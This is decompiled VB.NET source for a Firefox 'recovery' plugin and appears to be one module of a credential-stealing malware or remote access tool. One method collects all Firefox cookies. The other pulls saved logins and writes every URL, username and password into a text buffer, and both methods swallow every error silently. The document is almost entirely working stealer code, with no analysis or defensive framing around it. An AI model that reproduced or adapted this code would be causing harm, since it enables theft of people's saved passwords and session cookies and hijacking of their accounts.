Imports System
Imports System.Collections.Generic
Imports System.Text
Imports Plugin.Browsers.Firefox.Cookies

Namespace Plugin.Browsers.Firefox
	' Token: 0x02000011 RID: 17
	Public Class Firefox
		' Token: 0x06000080 RID: 128 RVA: 0x00005C5C File Offset: 0x00003E5C
		Public Sub CookiesRecovery(Cooks As StringBuilder)
			Try
				Dim ffcs As List(Of FFCookiesGrabber.FirefoxCookie) = FFCookiesGrabber.Cookies()
				For Each fcc As FFCookiesGrabber.FirefoxCookie In ffcs
					Dim flag As Boolean = Not String.IsNullOrWhiteSpace(fcc.ToString()) AndAlso Not Me.isOK
					If flag Then
						Cooks.Append(vbLf & "== Firefox ==========" & vbLf)
						Me.isOK = True
					End If
					Cooks.Append(String.Concat(New String() { fcc.ToString(), vbLf & vbLf }))
				Next
				Cooks.Append(vbLf)
			Catch
			End Try
		End Sub

		' Token: 0x06000081 RID: 129 RVA: 0x00005D24 File Offset: 0x00003F24
		Public Sub CredRecovery(Pass As StringBuilder)
			Try
				For Each passReader As IPassReader In New List(Of IPassReader)() From { New FirefoxPassReader() }
					For Each credentialModel As CredentialModel In passReader.ReadPasswords()
						Dim flag As Boolean = Not String.IsNullOrWhiteSpace(credentialModel.Url) AndAlso Not Me.isOK
						If flag Then
							Pass.Append(vbLf & "== Firefox ==========" & vbLf)
							Me.isOK = True
						End If
						Pass.Append(String.Concat(New String() { credentialModel.Url, vbLf & "U: ", credentialModel.Username, vbLf & "P: ", credentialModel.Password, vbLf & vbLf }))
					Next
				Next
			Catch
			End Try
		End Sub

		' Token: 0x04000031 RID: 49
		Public isOK As Boolean = False
	End Class
End Namespace
